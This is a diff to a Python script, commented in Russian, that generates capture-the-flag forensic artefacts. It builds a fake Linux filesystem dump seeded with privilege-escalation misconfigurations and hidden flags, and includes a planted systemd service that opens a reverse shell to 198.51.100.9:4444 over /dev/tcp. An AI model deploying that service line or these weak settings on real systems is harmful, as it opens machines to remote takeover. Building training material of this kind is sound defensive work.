@@ -613,6 +613,77 @@ def write_win_set(out_dir):
     return res
 
 
+# ---------------------------------------------------------------- дамп Linux-ФС
+
+def _fake_crypt(prefix, seed, n):
+    """Строка в формате crypt ($6$соль$хеш): тип определяется, пароля за ней нет."""
+    alpha = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    d = hashlib.sha512(seed.encode()).digest() * 2
+    salt = "".join(alpha[b % 64] for b in d[:16])
+    body = "".join(alpha[b % 64] for b in d[16:16 + n])
+    return f"{prefix}{salt}${body}"
+
+
+def write_linux_dump(root):
+    """Выгрузка ФС с типовыми админ-ошибками + лог, образ ВМ, Windows-артефакты.
+
+    → {"k8s"|"auth"|"vm"|"win": флаг}
+    """
+    f_k8s, f_auth, f_vm = gen_flag("admin_k8s_secret"), gen_flag("admin_auth"), gen_flag("admin_vm")
+    tok = hashlib.sha1(f_k8s.encode()).hexdigest()
+    b64 = lambda s: base64.b64encode(s.encode()).decode()  # noqa: E731
+    files = {
+        "etc/passwd": "root:x:0:0:root:/root:/bin/bash\n"
+                      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
+                      "bob:x:1000:1000:Bob:/home/bob:/bin/bash\n"
+                      "toor:x:0:0::/root:/bin/bash\n",
+        "etc/shadow": f"root:{_fake_crypt('$6$', 'root', 86)}:19700:0:99999:7:::\n"
+                      f"bob:{_fake_crypt('$y$j9T$', 'bob', 43)}:19700:0:99999:7:::\n"
+                      "daemon:*:19700:0:99999:7:::\n"
+                      "toor::19700:0:99999:7:::\n",
+        "etc/group": "root:x:0:\nsudo:x:27:bob\ndocker:x:999:bob\n",
+        "etc/sudoers": "Defaults env_reset\nDefaults env_keep += LD_PRELOAD\n"
+                       "root ALL=(ALL:ALL) ALL\n"
+                       "bob ALL=(root) NOPASSWD: /usr/bin/find, /usr/local/bin/backup.sh *\n",
+        "etc/crontab": "SHELL=/bin/sh\nPATH=/home/bob/bin:/usr/local/sbin:/usr/bin:/bin\n"
+                       "*/5 * * * * root /tmp/cleanup.sh\n"
+                       "0 * * * * root cd /var/backups && tar czf site.tgz *\n",
+        "etc/systemd/system/updater.service":
+            "[Unit]\nDescription=updater\n[Service]\n"
+            "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'\n"
+            "[Install]\nWantedBy=multi-user.target\n",
+        "etc/ssh/sshd_config": "Port 2222\nPermitRootLogin yes\nPermitEmptyPasswords yes\n"
+                               "PasswordAuthentication yes\n",
+        "etc/exports": "/srv/share *(rw,no_root_squash)\n",
+        "home/bob/.git-credentials": f"https://bob:tok_{tok[:20]}@git.example.com\n",
+        "home/bob/.ssh/authorized_keys": 'command="/usr/local/bin/backup.sh" ssh-ed25519 '
+                                         'AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyNotReal bob@laptop\n',
+        "home/bob/.local/share/Trash/info/notes.txt.trashinfo":
+            "[Trash Info]\nPath=/home/bob/notes.txt\nDeletionDate=2024-03-14T09:30:00\n",
+        "opt/app/docker-compose.yml": "services:\n  web:\n    image: app\n    privileged: true\n"
+                                      "    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n"
+                                      f"    environment:\n      - DB_PASSWORD=pw_{tok[20:28]}\n",
+        "opt/app/k8s/secret.yaml": "apiVersion: v1\nkind: Secret\nmetadata:\n  name: app\n"
+                                   f"type: Opaque\ndata:\n  flag: {b64(f_k8s)}\n  user: {b64('admin')}\n",
+        "opt/app/.env": f"APP_ENV=prod\nSECRET_KEY=sk_{tok[28:40]}\n",
+        "root/suid.txt": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/mount\n"
+                         "/opt/tools/backup\n",
+        "root/caps.txt": "/usr/bin/python3.11 cap_setuid=ep\n/usr/bin/ping cap_net_raw=ep\n",
+        "var/log/auth.log": make_auth_log(f_auth),
+    }
+    for relp, text in files.items():
+        p = os.path.join(root, *relp.split("/"))
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        with open(p, "w", encoding="utf-8", newline="\n") as f:
+            f.write(text)
+    img = os.path.join(root, "srv", "images", "disk.qcow2")
+    os.makedirs(os.path.dirname(img), exist_ok=True)
+    with open(img, "wb") as f:
+        f.write(make_qcow2(make_disk_raw(f_vm)[0]))
+    win = write_win_set(os.path.join(root, "win"))
+    return {"k8s": f_k8s, "auth": f_auth, "vm": f_vm, "win": win["system"][1]}
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--out", required=True, help="папка для артефактов")
@@ -624,6 +695,8 @@ def main():
         manifest["log_" + k] = {"path": p, "flag": flag}
     for k, (p, flag) in write_win_set(os.path.join(a.out, "win")).items():
         manifest["win_" + k] = {"path": p, "flag": flag}
+    for k, flag in write_linux_dump(os.path.join(a.out, "fsdump")).items():
+        manifest["dump_" + k] = {"path": os.path.join(a.out, "fsdump"), "flag": flag}
     with open(os.path.join(a.out, "manifest.json"), "w", encoding="utf-8") as f:
         json.dump(manifest, f, ensure_ascii=False, indent=2)
     print(f"[+] {len(manifest)} артефактов в {a.out}")
